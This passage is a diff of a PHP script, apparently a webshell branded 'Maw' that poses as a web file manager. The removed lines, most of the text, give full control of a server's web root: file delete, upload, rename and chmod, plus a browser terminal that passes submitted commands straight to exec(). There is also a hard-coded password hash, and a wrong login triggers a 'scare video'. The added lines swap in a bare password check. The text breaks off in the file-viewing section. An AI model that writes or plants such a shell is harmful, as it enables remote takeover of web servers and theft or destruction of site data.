@@ -1,2332 +1,1687 @@
 <?php
-ob_start();
+session_start();
 
-$use_auth = true;
-$auth_users = array(
-    'maw' => '$2a$12$PzO.GuHsJgEMfPRW6DI/juY8PwjaN3cf8S0sbC/folckvfEvlGTs.',
-);
+$hashed_password = '$2a$12$PzO.GuHsJgEMfPRW6DI/juY8PwjaN3cf8S0sbC/folckvfEvlGTs.';
 
-$use_highlightjs = true;
-$highlightjs_style = 'vs';
-$default_timezone = 'Asia/Jakarta'; // UTC+3
-$root_path = $_SERVER['DOCUMENT_ROOT'];
-$root_url = '';
-$http_host = $_SERVER['HTTP_HOST'];
-$iconv_input_encoding = 'CP1251';
-$datetime_format = 'd.m.y H:i';
-
-if (defined('FM_EMBED')) {
-    $use_auth = false;
-} else {
-    @set_time_limit(600);
-
-    date_default_timezone_set($default_timezone);
-
-    ini_set('default_charset', 'UTF-8');
-    if (version_compare(PHP_VERSION, '5.6.0', '<') && function_exists('mb_internal_encoding')) {
-        mb_internal_encoding('UTF-8');
-    }
-    if (function_exists('mb_regex_encoding')) {
-        mb_regex_encoding('UTF-8');
-    }
-
-    session_cache_limiter('');
-    session_name('filemanager');
-    session_start();
+function isAuthenticated() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
 }
 
-if (empty($auth_users)) {
-    $use_auth = false;
-}
-
-$is_https = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
-    || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';
-
-$root_path = rtrim($root_path, '\\/');
-$root_path = str_replace('\\', '/', $root_path);
-if (!@is_dir($root_path)) {
-    echo sprintf('<h1>Root path "%s" not found!</h1>', fm_enc($root_path));
-    exit;
-}
-
-$root_url = fm_clean_path($root_url);
-
-defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $root_path);
-defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
-defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);
-
-$p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');
-$p = fm_clean_path($p);
-defined('FM_PATH') || define('FM_PATH', $p);
-defined('FM_IS_WIN') || define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');
-
-if (isset($_GET['logout'])) {
-    unset($_SESSION['logged']);
-    fm_redirect(FM_SELF_URL);
-}
-
-if (isset($_GET['img'])) {
-    fm_show_image($_GET['img']);
-}
-
-if (isset($_GET['view']) && $_GET['view'] == 'terminal' && isset($_POST['cmd'])) {
-    if (ob_get_level() > 0) {
-        ob_clean();
-    }
-
-    header('Content-Type: application/json');
-
-    set_error_handler(function($errno, $errstr, $errfile, $errline) {
-        echo json_encode(array(
-            'error' => true,
-            'output' => "PHP Error [$errno]: $errstr in $errfile on line $errline\n",
-            'cwd' => getcwd()
-        ));
-        exit;
-    });
-
-    if ($use_auth && !isset($_SESSION['logged'])) {
-        http_response_code(401);
-        echo json_encode(array(
-            'error' => 'Unauthorized',
-            'output' => 'Error: Authentication required'
-        ));
-        exit;
-    }
-
-    $cmd = $_POST['cmd'];
-
-    $current_path = isset($_GET['p']) ? $_GET['p'] : '';
-    if (!empty($current_path) && defined('FM_PATH')) {
-        $current_path = FM_PATH;
-    }
-
-    $path = FM_ROOT_PATH;
-    if (!empty($current_path)) {
-        $path .= '/' . ltrim($current_path, '/');
-    }
-
-    $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : $path;
-    $out = '';
-    $error = false;
-
-    try {
-        if (!is_dir($cwd)) {
-            $cwd = $path;
-        }
-
-        if (!@chdir($cwd)) {
-            throw new Exception("Failed to change directory to: $cwd");
-        }
-
-        if($cmd == 'ls') {
-            $cmd = 'ls -la';
-        }
-
-        $io = array();
-
-        if (function_exists('exec')) {
-            @exec($cmd . ' 2>&1', $io, $ret);
-
-            foreach($io as $o) {
-                $out .= htmlspecialchars($o) . "\n";
-            }
-        } else {
-            throw new Exception('exec function is not enabled on this server');
-        }
-
-    } catch (Exception $e) {
-        $error = true;
-        $out = 'Error: ' . $e->getMessage() . "\n";
-    }
-
-    $res = array(
-        'cwd' => getcwd(),
-        'output' => $out
-    );
-
-    if ($error) {
-        $res['error'] = true;
-    }
-
-    echo json_encode($res);
-    exit;
-}
-
-if ($use_auth) {
-    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
-    } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'])) {
-        sleep(1);
-        if (isset($auth_users[$_POST['fm_usr']]) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']])) {
-            $_SESSION['logged'] = $_POST['fm_usr'];
-            fm_set_msg('You are logged in');
-            fm_redirect(FM_SELF_URL . '?p=');
-        } else {
-            unset($_SESSION['logged']);
-            $_SESSION['show_scare'] = true; // Trigger scare video
-            fm_set_msg('Wrong password', 'error');
-            fm_redirect(FM_SELF_URL);
-        }
-    } else {
-        unset($_SESSION['logged']);
-        fm_show_header();
-        fm_show_message();
-        ?>
-        <div class="path">
-            <form action="" method="post" style="margin:10px;text-align:center">
-                <input name="fm_usr" value="" placeholder="Username" required>
-                <input type="password" name="fm_pwd" value="" placeholder="Password" required>
-                <input type="submit" value="Login">
-            </form>
-        </div>
-        <?php
-        fm_show_footer();
-        exit;
-    }
-}
-
-if (!defined('FM_IS_WIN')) {
-    define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');
-}
-
-if (!isset($_GET['p'])) {
-    fm_redirect(FM_SELF_URL . '?p=');
-}
-
-defined('FM_USE_AUTH') || define('FM_USE_AUTH', $use_auth);
-
-defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
-defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $use_highlightjs);
-defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $highlightjs_style);
-defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $datetime_format);
-
-unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style);
-
-if (isset($_GET['del'])) {
-    $del = $_GET['del'];
-    $del = fm_clean_path($del);
-    $del = str_replace('/', '', $del);
-    if ($del != '' && $del != '..' && $del != '.') {
-        $path = FM_ROOT_PATH;
-        if (FM_PATH != '') {
-            $path .= '/' . FM_PATH;
-        }
-        $is_dir = is_dir($path . '/' . $del);
-        if (fm_rdelete($path . '/' . $del)) {
-            $msg = $is_dir ? 'Folder <b>%s</b> deleted' : 'File <b>%s</b> deleted';
-            fm_set_msg(sprintf($msg, fm_enc($del)));
-        } else {
-            $msg = $is_dir ? 'Folder <b>%s</b> not deleted' : 'File <b>%s</b> not deleted';
-            fm_set_msg(sprintf($msg, fm_enc($del)), 'error');
-        }
-    } else {
-        fm_set_msg('Wrong file or folder name', 'error');
-    }
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_GET['new'])) {
-    $new = strip_tags($_GET['new']);
-    $new = fm_clean_path($new);
-    $new = str_replace('/', '', $new);
-    if ($new != '' && $new != '..' && $new != '.') {
-        $path = FM_ROOT_PATH;
-        if (FM_PATH != '') {
-            $path .= '/' . FM_PATH;
-        }
-        if (fm_mkdir($path . '/' . $new, false) === true) {
-            fm_set_msg(sprintf('Folder <b>%s</b> created', fm_enc($new)));
-        } elseif (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
-            fm_set_msg(sprintf('Folder <b>%s</b> already exists', fm_enc($new)), 'alert');
-        } else {
-            fm_set_msg(sprintf('Folder <b>%s</b> not created', fm_enc($new)), 'error');
-        }
-    } else {
-        fm_set_msg('Wrong folder name', 'error');
-    }
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_GET['copy'], $_GET['finish'])) {
-    $copy = $_GET['copy'];
-    $copy = fm_clean_path($copy);
-    if ($copy == '') {
-        fm_set_msg('Source path not defined', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    $from = FM_ROOT_PATH . '/' . $copy;
-    $dest = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $dest .= '/' . FM_PATH;
-    }
-    $dest .= '/' . basename($from);
-    $move = isset($_GET['move']);
-    if ($from != $dest) {
-        $msg_from = trim(FM_PATH . '/' . basename($from), '/');
-        if ($move) {
-            $rename = fm_rename($from, $dest);
-            if ($rename) {
-                fm_set_msg(sprintf('Moved from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
-            } elseif ($rename === null) {
-                fm_set_msg('File or folder with this path already exists', 'alert');
-            } else {
-                fm_set_msg(sprintf('Error while moving from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
-            }
-        } else {
-            if (fm_rcopy($from, $dest)) {
-                fm_set_msg(sprintf('Copyied from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
-            } else {
-                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
-            }
-        }
-    } else {
-        fm_set_msg('Paths must be not equal', 'alert');
-    }
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-
-if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'])) {
-
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $copy_to_path = FM_ROOT_PATH;
-    $copy_to = fm_clean_path($_POST['copy_to']);
-    if ($copy_to != '') {
-        $copy_to_path .= '/' . $copy_to;
-    }
-    if ($path == $copy_to_path) {
-        fm_set_msg('Paths must be not equal', 'alert');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-    if (!is_dir($copy_to_path)) {
-        if (!fm_mkdir($copy_to_path, true)) {
-            fm_set_msg('Unable to create destination folder', 'error');
-            fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-        }
-    }
-
-    $move = isset($_POST['move']);
-
-    $errors = 0;
-    $files = $_POST['file'];
-    if (is_array($files) && count($files)) {
-        foreach ($files as $f) {
-            if ($f != '') {
-
-                $from = $path . '/' . $f;
-
-                $dest = $copy_to_path . '/' . $f;
-
-                if ($move) {
-                    $rename = fm_rename($from, $dest);
-                    if ($rename === false) {
-                        $errors++;
-                    }
-                } else {
-                    if (!fm_rcopy($from, $dest)) {
-                        $errors++;
-                    }
-                }
-            }
-        }
-        if ($errors == 0) {
-            $msg = $move ? 'Selected files and folders moved' : 'Selected files and folders copied';
-            fm_set_msg($msg);
-        } else {
-            $msg = $move ? 'Error while moving items' : 'Error while copying items';
-            fm_set_msg($msg, 'error');
-        }
-    } else {
-        fm_set_msg('Nothing selected', 'alert');
-    }
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_GET['ren'], $_GET['to'])) {
-
-    $old = $_GET['ren'];
-    $old = fm_clean_path($old);
-    $old = str_replace('/', '', $old);
-
-    $new = $_GET['to'];
-    $new = fm_clean_path($new);
-    $new = str_replace('/', '', $new);
-
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    if ($old != '' && $new != '') {
-        if (fm_rename($path . '/' . $old, $path . '/' . $new)) {
-            fm_set_msg(sprintf('Renamed from <b>%s</b> to <b>%s</b>', fm_enc($old), fm_enc($new)));
-        } else {
-            fm_set_msg(sprintf('Error while renaming from <b>%s</b> to <b>%s</b>', fm_enc($old), fm_enc($new)), 'error');
-        }
-    } else {
-        fm_set_msg('Names not set', 'error');
-    }
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_GET['dl'])) {
-    $dl = $_GET['dl'];
-    $dl = fm_clean_path($dl);
-    $dl = str_replace('/', '', $dl);
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-    if ($dl != '' && is_file($path . '/' . $dl)) {
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($path . '/' . $dl) . '"');
-        header('Content-Transfer-Encoding: binary');
-        header('Connection: Keep-Alive');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($path . '/' . $dl));
-        readfile($path . '/' . $dl);
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
         exit;
     } else {
-        fm_set_msg('File not found', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
+        $error = "Denied!";
     }
 }
 
-if (isset($_POST['upl'])) {
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $errors = 0;
-    $uploads = 0;
-    $total = count($_FILES['upload']['name']);
-
-    for ($i = 0; $i < $total; $i++) {
-        $tmp_name = $_FILES['upload']['tmp_name'][$i];
-        if (empty($_FILES['upload']['error'][$i]) && !empty($tmp_name) && $tmp_name != 'none') {
-            if (move_uploaded_file($tmp_name, $path . '/' . $_FILES['upload']['name'][$i])) {
-                $uploads++;
-            } else {
-                $errors++;
-            }
-        }
-    }
-
-    if ($errors == 0 && $uploads > 0) {
-        fm_set_msg(sprintf('All files uploaded to <b>%s</b>', fm_enc($path)));
-    } elseif ($errors == 0 && $uploads == 0) {
-        fm_set_msg('Nothing uploaded', 'alert');
-    } else {
-        fm_set_msg(sprintf('Error while uploading files. Uploaded files: %s', $uploads), 'error');
-    }
-
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_POST['group'], $_POST['delete'])) {
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $errors = 0;
-    $files = $_POST['file'];
-    if (is_array($files) && count($files)) {
-        foreach ($files as $f) {
-            if ($f != '') {
-                $new_path = $path . '/' . $f;
-                if (!fm_rdelete($new_path)) {
-                    $errors++;
-                }
-            }
-        }
-        if ($errors == 0) {
-            fm_set_msg('Selected files and folder deleted');
-        } else {
-            fm_set_msg('Error while deleting items', 'error');
-        }
-    } else {
-        fm_set_msg('Nothing selected', 'alert');
-    }
-
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_POST['group'], $_POST['zip'])) {
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    if (!class_exists('ZipArchive')) {
-        fm_set_msg('Operations with archives are not available', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    $files = $_POST['file'];
-    if (!empty($files)) {
-        chdir($path);
-
-        if (count($files) == 1) {
-            $one_file = reset($files);
-            $one_file = basename($one_file);
-            $zipname = $one_file . '_' . date('ymd_His') . '.zip';
-        } else {
-            $zipname = 'archive_' . date('ymd_His') . '.zip';
-        }
-
-        $zipper = new FM_Zipper();
-        $res = $zipper->create($zipname, $files);
-
-        if ($res) {
-            fm_set_msg(sprintf('Archive <b>%s</b> created', fm_enc($zipname)));
-        } else {
-            fm_set_msg('Archive not created', 'error');
-        }
-    } else {
-        fm_set_msg('Nothing selected', 'alert');
-    }
-
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_GET['unzip'])) {
-    $unzip = $_GET['unzip'];
-    $unzip = fm_clean_path($unzip);
-    $unzip = str_replace('/', '', $unzip);
-
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    if (!class_exists('ZipArchive')) {
-        fm_set_msg('Operations with archives are not available', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    if ($unzip != '' && is_file($path . '/' . $unzip)) {
-        $zip_path = $path . '/' . $unzip;
-
-        $tofolder = '';
-        if (isset($_GET['tofolder'])) {
-            $tofolder = pathinfo($zip_path, PATHINFO_FILENAME);
-            if (fm_mkdir($path . '/' . $tofolder, true)) {
-                $path .= '/' . $tofolder;
-            }
-        }
-
-        $zipper = new FM_Zipper();
-        $res = $zipper->unzip($zip_path, $path);
-
-        if ($res) {
-            fm_set_msg('Archive unpacked');
-        } else {
-            fm_set_msg('Archive not unpacked', 'error');
-        }
-
-    } else {
-        fm_set_msg('File not found', 'error');
-    }
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-if (isset($_POST['chmod']) && !FM_IS_WIN) {
-    $path = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $path .= '/' . FM_PATH;
-    }
-
-    $file = $_POST['chmod'];
-    $file = fm_clean_path($file);
-    $file = str_replace('/', '', $file);
-    if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) {
-        fm_set_msg('File not found', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    $mode = 0;
-    if (!empty($_POST['ur'])) {
-        $mode |= 0400;
-    }
-    if (!empty($_POST['uw'])) {
-        $mode |= 0200;
-    }
-    if (!empty($_POST['ux'])) {
-        $mode |= 0100;
-    }
-    if (!empty($_POST['gr'])) {
-        $mode |= 0040;
-    }
-    if (!empty($_POST['gw'])) {
-        $mode |= 0020;
-    }
-    if (!empty($_POST['gx'])) {
-        $mode |= 0010;
-    }
-    if (!empty($_POST['or'])) {
-        $mode |= 0004;
-    }
-    if (!empty($_POST['ow'])) {
-        $mode |= 0002;
-    }
-    if (!empty($_POST['ox'])) {
-        $mode |= 0001;
-    }
-
-    if (@chmod($path . '/' . $file, $mode)) {
-        fm_set_msg('Permissions changed');
-    } else {
-        fm_set_msg('Permissions not changed', 'error');
-    }
-
-    fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-}
-
-$path = FM_ROOT_PATH;
-if (FM_PATH != '') {
-    $path .= '/' . FM_PATH;
-}
-
-if (!is_dir($path)) {
-    fm_redirect(FM_SELF_URL . '?p=');
-}
-
-$parent = fm_get_parent_path(FM_PATH);
-
-$objects = is_readable($path) ? scandir($path) : array();
-$folders = array();
-$files = array();
-if (is_array($objects)) {
-    foreach ($objects as $file) {
-        if ($file == '.' || $file == '..') {
-            continue;
-        }
-        $new_path = $path . '/' . $file;
-        if (is_file($new_path)) {
-            $files[] = $file;
-        } elseif (is_dir($new_path) && $file != '.' && $file != '..') {
-            $folders[] = $file;
-        }
-    }
-}
-
-if (!empty($files)) {
-    natcasesort($files);
-}
-if (!empty($folders)) {
-    natcasesort($folders);
-}
-
-if (isset($_GET['upload'])) {
-    fm_show_header();
-    fm_show_nav_path(FM_PATH);
-    ?>
-    <div class="path">
-        <p><b>Uploading files</b></p>
-        <p class="break-word">Destination folder: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?></p>
-        <form action="" method="post" enctype="multipart/form-data">
-            <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-            <input type="hidden" name="upl" value="1">
-            <input type="file" name="upload[]"><br>
-            <input type="file" name="upload[]"><br>
-            <input type="file" name="upload[]"><br>
-            <input type="file" name="upload[]"><br>
-            <input type="file" name="upload[]"><br>
-            <br>
-            <p>
-                <button class="btn"><i class="icon-apply"></i> Upload</button> &nbsp;
-                <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-cancel"></i> Cancel</a></b>
-            </p>
-        </form>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_POST['copy'])) {
-    $copy_files = $_POST['file'];
-    if (!is_array($copy_files) || empty($copy_files)) {
-        fm_set_msg('Nothing selected', 'alert');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    fm_show_header();
-    fm_show_nav_path(FM_PATH);
-    ?>
-    <div class="path">
-        <p><b>Copying</b></p>
-        <form action="" method="post">
-            <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-            <input type="hidden" name="finish" value="1">
-            <?php
-            foreach ($copy_files as $cf) {
-                echo '<input type="hidden" name="file[]" value="' . fm_enc($cf) . '">' . PHP_EOL;
-            }
-            $copy_files_enc = array_map('fm_enc', $copy_files);
-            ?>
-            <p class="break-word">Files: <b><?php echo implode('</b>, <b>', $copy_files_enc) ?></b></p>
-            <p class="break-word">Source folder: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
-                <label for="inp_copy_to">Destination folder:</label>
-                <?php echo FM_ROOT_PATH ?>/<input name="copy_to" id="inp_copy_to" value="<?php echo fm_enc(FM_PATH) ?>">
-            </p>
-            <p><label><input type="checkbox" name="move" value="1"> Move</label></p>
-            <p>
-                <button class="btn"><i class="icon-apply"></i> Copy</button> &nbsp;
-                <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-cancel"></i> Cancel</a></b>
-            </p>
-        </form>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_GET['copy']) && !isset($_GET['finish'])) {
-    $copy = $_GET['copy'];
-    $copy = fm_clean_path($copy);
-    if ($copy == '' || !file_exists(FM_ROOT_PATH . '/' . $copy)) {
-        fm_set_msg('File not found', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    fm_show_header();
-    fm_show_nav_path(FM_PATH);
-    ?>
-    <div class="path">
-        <p><b>Copying</b></p>
-        <p class="break-word">
-            Source path: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . $copy)) ?><br>
-            Destination folder: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
-        </p>
-        <p>
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1"><i class="icon-apply"></i> Copy</a></b> &nbsp;
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1&amp;move=1"><i class="icon-apply"></i> Move</a></b> &nbsp;
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-cancel"></i> Cancel</a></b>
-        </p>
-        <p><i>Select folder:</i></p>
-        <ul class="folders break-word">
-            <?php
-            if ($parent !== false) {
-                ?>
-                <li><a href="?p=<?php echo urlencode($parent) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="icon-arrow_up"></i> ..</a></li>
-            <?php
-            }
-            foreach ($folders as $f) {
-                ?>
-                <li><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="icon-folder"></i> <?php echo fm_enc(fm_convert_win($f)) ?></a></li>
-            <?php
-            }
-            ?>
-        </ul>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_GET['view']) && $_GET['view'] == 'terminal') {
-    fm_show_header();
-    fm_show_nav_path(FM_PATH);
-    ?>
-    <div class="path">
-        <p><b>Terminal</b></p>
-        <div class="terminal-container" style="background: #1a1a1a; color: #00d9ff; padding: 20px; font-family: 'Fira Code', monospace; border: 1px solid #00d9ff; box-shadow: 0 0 15px rgba(0, 217, 255, 0.2); min-height: 400px; display: flex; flex-direction: column;">
-            <div id="terminal-output" style="flex-grow: 1; overflow-y: auto; white-space: pre-wrap; margin-bottom: 20px; max-height: 600px;">Welcome to Maw
-Type 'help' for available commands.
-</div>
-            <div class="terminal-input" style="display: flex; gap: 10px; align-items: center;">
-                <span id="prompt-cwd" style="color: #ff00ff;"><?php echo fm_enc(getcwd()) ?> $</span>
-                <input type="text" id="cmd-input" style="flex-grow: 1; background: transparent; border: none; border-bottom: 1px solid #00d9ff; color: #e0e0e0; font-family: inherit; font-size: 14px; padding: 5px;" autofocus autocomplete="off">
-            </div>
-        </div>
-        <script>
-            document.addEventListener('DOMContentLoaded', function() {
-                const termInput = document.getElementById('cmd-input');
-                const termOutput = document.getElementById('terminal-output');
-                const promptCwd = document.getElementById('prompt-cwd');
-                let currentCwd = '<?php echo addslashes(getcwd()) ?>';
-                let commandHistory = [];
-                let historyIndex = -1;
-
-                termInput.addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter') {
-                        const cmd = this.value.trim();
-                        if (cmd) {
-                            commandHistory.push(cmd);
-                            historyIndex = commandHistory.length;
-                            this.value = '';
-                            executeCommand(cmd);
-                        }
-                    } else if (e.key === 'ArrowUp') {
-                        e.preventDefault();
-                        if (historyIndex > 0) {
-                            historyIndex--;
-                            this.value = commandHistory[historyIndex];
-                        }
-                    } else if (e.key === 'ArrowDown') {
-                        e.preventDefault();
-                        if (historyIndex < commandHistory.length - 1) {
-                            historyIndex++;
-                            this.value = commandHistory[historyIndex];
-                        } else {
-                            historyIndex = commandHistory.length;
-                            this.value = '';
-                        }
-                    }
-                });
-
-                function executeCommand(cmd) {
-                    termOutput.innerText += '\n' + promptCwd.innerText + ' ' + cmd + '\n';
-                    termOutput.scrollTop = termOutput.scrollHeight;
-
-                    if (cmd === 'clear') {
-                        termOutput.innerText = '';
-                        return;
-                    }
-
-                    const formData = new FormData();
-                    formData.append('cmd', cmd);
-                    formData.append('cwd', currentCwd);
-
-                    fetch('?view=terminal', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.output) {
-                            termOutput.innerText += data.output;
-                        }
-                        if (data.cwd) {
-                            currentCwd = data.cwd;
-                            promptCwd.innerText = data.cwd + ' $';
-                        }
-                        termOutput.scrollTop = termOutput.scrollHeight;
-                    })
-                    .catch(error => {
-                        termOutput.innerText += 'Error: ' + error + '\n';
-                    });
-                }
-            });
-        </script>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_GET['view'])) {
-    $file = $_GET['view'];
-    $file = fm_clean_path($file);
-    $file = str_replace('/', '', $file);
-    if ($file == '' || !is_file($path . '/' . $file)) {
-        fm_set_msg('File not found', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    fm_show_header();
-    fm_show_nav_path(FM_PATH);
-
-    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
-    $file_path = $path . '/' . $file;
-
-    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    $mime_type = fm_get_mime_type($file_path);
-    $filesize = filesize($file_path);
-
-    $is_zip = false;
-    $is_image = false;
-    $is_audio = false;
-    $is_video = false;
-    $is_text = false;
-
-    $view_title = 'File';
-    $filenames = false;
-    $content = '';
-
-    if ($ext == 'zip') {
-        $is_zip = true;
-        $view_title = 'Archive';
-        $filenames = fm_get_zif_info($file_path);
-    } elseif (in_array($ext, fm_get_image_exts())) {
-        $is_image = true;
-        $view_title = 'Image';
-    } elseif (in_array($ext, fm_get_audio_exts())) {
-        $is_audio = true;
-        $view_title = 'Audio';
-    } elseif (in_array($ext, fm_get_video_exts())) {
-        $is_video = true;
-        $view_title = 'Video';
-    } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
-        $is_text = true;
-        $content = file_get_contents($file_path);
-    }
-
-    ?>
-    <div class="path">
-        <p class="break-word"><b><?php echo $view_title ?> "<?php echo fm_enc(fm_convert_win($file)) ?>"</b></p>
-        <p class="break-word">
-            Full path: <?php echo fm_enc(fm_convert_win($file_path)) ?><br>
-            File size: <?php echo fm_get_filesize($filesize) ?><?php if ($filesize >= 1000): ?> (<?php echo sprintf('%s bytes', $filesize) ?>)<?php endif; ?><br>
-            MIME-type: <?php echo $mime_type ?><br>
-            <?php
-            if ($is_zip && $filenames !== false) {
-                $total_files = 0;
-                $total_comp = 0;
-                $total_uncomp = 0;
-                foreach ($filenames as $fn) {
-                    if (!$fn['folder']) {
-                        $total_files++;
-                    }
-                    $total_comp += $fn['compressed_size'];
-                    $total_uncomp += $fn['filesize'];
-                }
-                ?>
-                Files in archive: <?php echo $total_files ?><br>
-                Total size: <?php echo fm_get_filesize($total_uncomp) ?><br>
-                Size in archive: <?php echo fm_get_filesize($total_comp) ?><br>
-                Compression: <?php echo round(($total_comp / $total_uncomp) * 100) ?>%<br>
-                <?php
-            }
-            if ($is_image) {
-                $image_size = getimagesize($file_path);
-                echo 'Image sizes: ' . (isset($image_size[0]) ? $image_size[0] : '0') . ' x ' . (isset($image_size[1]) ? $image_size[1] : '0') . '<br>';
-            }
-            if ($is_text) {
-                $is_utf8 = fm_is_utf8($content);
-                if (function_exists('iconv')) {
-                    if (!$is_utf8) {
-                        $content = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
-                    }
-                }
-                echo 'Charset: ' . ($is_utf8 ? 'utf-8' : '8 bit') . '<br>';
-            }
-            ?>
-        </p>
-        <p>
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($file) ?>"><i class="icon-download"></i> Download</a></b> &nbsp;
